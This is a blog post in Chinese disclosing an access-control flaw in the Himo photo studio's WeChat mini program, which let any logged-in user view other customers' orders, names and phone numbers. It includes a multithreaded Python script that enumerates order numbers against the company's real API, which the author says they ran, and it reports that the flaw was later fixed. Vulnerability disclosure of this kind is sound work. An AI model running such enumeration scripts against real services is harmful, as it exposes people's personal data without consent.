---
title: "Himo Mini Program Security Issues"
date: 2023-05-29T00:31:40+08:00
draft: false
tags: [Information Security, Himo]
---

> 因为预约了 6 月头在香港的 F1 签证，所以需要准备一张 **签证照**，在家这边的小城市，也没什么选择，没有 **天真蓝**，最好的就是 **海马体** 了。海马体生意还挺好，当天都约不到，只能约到 5 月 14 日星期天

在 2023 年 5 月 16 日我已经向海马体的技术团队提交了 **可能存在的安全问题**。~~直到今天（2023 年 5 月 29 日），我没有收到海马体技术团队的任何回信，我决定在我的个人博客公开。~~ 2023 年 5 月 31 日我收到了海马体技术团队的邮件，已经修复了该问题。

我在拍完照之后，现场等待了一会，大概也就不到半个小时，小姐姐就基本上修好了，让我确认一下是否有需要修改的地方，没有的话就开始打印了。打印完之后，她告诉我电子版随时可以在 **海马体小程序** 随时下载。这一点我觉得非常方便。

晚上在家的时候，突然想到海马体小程序的这回事，我在想这些个人的照片应该是存储在 **OSS** 上的，但是我在想会不会有可能是订单号+编号这样子的文件名来存储的，简单说就是这个图片的链接是有规律的。如果真的是这样的话，我就可以轻松拿到所有用户的照片。

我在 iPhone 上开启了抓包，结果发现所有的照片的外链确实是固定的，只不过文件名是随机的一串字符串，似乎没有任何规律，应该就是完全随机的。然而有一个 API 会返回这个用户所有的照片的文件名，这个 API 传递的参数似乎没有类似于 **userID** 这类的参数，也就是说完全按照 **Cookie** 来判断哪位用户的。到这里，想拿到别的用户的照片外链的计划算是泡汤了。

我又想到因为每一次的照片肯定是和订单绑定的，也就是说一个 **签证照** 订单，理论上应该就固定的只有 4 张图。我又仔细地看了一下订单返回的参数，比较有价值的就是用户名、手机号这些，别的都是预约的门店、门店地址、门店联系电话、订单价格之类的一些东西。但是有一个意外的惊喜，我发现订单详情的 API 在 GET 请求的时候携带了 **orderNo** 参数，我赶紧使用 API 测试工具，发起了请求，把 **orderNo** 改一个数字，API 返回了 “订单不存在”。心里窃喜，竟然返回的是订单不存在，而不是无权限，说明我的 **Cookie** 应该可以查看别人的订单信息，我可以拿到任何注册 **海马体小程序** 用户的 **联系方式**。

我的订单的 **orderNo** 是 **T2023051413359999**，以首字母 T 开头，前 8 位是当天的日期，后面的 8 个纯数字应该是随机的，但是这难不倒我，手搓一个 **Python** 脚本，从 **00000000** 穷举到 **99999999** 不就完事了，在多线程的帮助下，简直是小菜一碟。

```python
# 这是示例代码，不能直接运行

import threading
import httpx

headers = {
	"app-key": "himo-wx-mini-program",
	"content-type": "application/json",
	"X-Stream-Id": "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
	"User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.37(0x18002528) NetType/WIFI Language/en",
	"Referer": "https://servicewechat.com/xxxxx/456/page-frame.html"
}

semaphore = threading.Semaphore(10)

def getOrderDetails(orderId):
	try:
		with semaphore:
			url = f"https://api-gateway.hzmantu.com/appointment_platform/order/order/order_detail?orderNo=T20230515{orderId}"
			resp = httpx.get(url=url, headers=headers)
			if resp.status_code == 200:
				with open("result.json", "a") as f:
					f.write(resp.text)
				print(resp.text)
	finally:
		semaphore.__exit__(None, None, None)
			
threads = []
for orderId in range(10013132, 99999999):
	thread = threading.Thread(target=getOrderDetails, args=(orderId,))
	thread.start()
	threads.append(thread)
	
for thread in threads:
	thread.join()
```

很快，Python 的程序跑出了结果，验证了我的猜想。来自 **武汉** 的一位幸运网友。（**为了保护他人隐私，已将关键信息打码**）

![202305295XA9GS](https://static.nisekoo.com/blog/202305295XA9GS.png)

我在 5 月 15 日凌晨发了一条朋友圈和微博，在微博艾特了 **缦图摄影** 和 **海马体照相馆**。很荣幸，在微博私信和我的邮箱都有工作人员联系我，下午醒来的时候我及时地回复了邮件，很遗憾的是过去了接近 2 周的时间，我没有收到任何回信，我不知道他们是修复了这个问题，还是说直接忽略了。之后我也没有再去验证。

![20230529fzK3kq](https://static.nisekoo.com/blog/20230529fzK3kq.png)

其实我写这篇博客，只是想分享这一段有趣的小研究，也算是为海马体做出一点点贡献。**海马体小程序** 其实只是一个很好的例子，其实他们并不是一家小公司，而是一家在中国大陆范围内规模挺大的公司。除了海马体，在过去的时间里我还有研究过很多类似的小程序，很遗憾，大部分小程序都没有在 **用户个人信息** 做到很好保护。